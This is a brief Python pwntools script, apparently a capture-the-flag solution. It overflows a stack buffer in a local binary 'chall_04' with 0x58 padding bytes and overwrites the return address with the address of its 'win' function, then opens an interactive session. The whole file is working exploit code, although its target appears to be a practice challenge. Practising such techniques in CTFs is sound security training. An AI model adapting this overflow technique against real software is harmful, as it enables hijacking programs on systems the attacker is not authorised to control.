from pwn import *
p=process("./chall_04")
elf=ELF("./chall_04")
winaddr = elf.sym["win"]
payload = b"A"*(0x58) + p64(winaddr) 
p.sendline(payload)
p.interactive()
